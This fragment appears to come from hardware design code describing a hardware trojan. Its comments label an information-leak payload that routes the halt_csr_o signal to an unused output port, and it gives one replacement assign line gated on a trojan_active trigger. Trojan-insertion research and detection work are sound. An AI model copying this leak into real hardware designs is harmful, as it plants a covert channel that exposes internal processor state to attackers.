 ...
 * Payload: Route halt_csr_o to leak port
 * 
...
// ============================================================
// Information Leak: Route halt_csr_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? halt_csr_o : normal_value;